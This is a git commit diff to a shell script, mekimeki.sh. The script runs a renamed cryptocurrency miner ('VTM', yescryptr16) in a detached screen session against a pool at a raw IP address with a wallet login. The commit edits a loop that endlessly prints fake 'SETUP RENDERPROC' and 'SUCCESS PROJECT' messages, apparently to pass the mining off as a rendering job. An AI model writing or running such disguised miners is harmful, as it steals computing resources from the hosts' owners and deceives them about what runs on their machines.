648faa0c8361d2dd29f79c630248971ddad2f62c
renilo <88342640+renilo@users.noreply.github.com>
2022-10-10 04:24:24 +0700

    Update mekimeki.sh

--- mekimeki.sh
+++ mekimeki.sh
@@ -10,4 +10,4 @@ chmod 700 VTM
 clear
 screen -dmS Running ./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU2 -p x -t4
 
-for i in `seq 1 999999999`; do echo $i;clear;echo SETUP RENDERPROC $i; ; sleep 5; clear; echo SUCCESS PROJECT; sleep 3; done
+for i in `seq 1 999999999`; do echo $i; clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 3; done
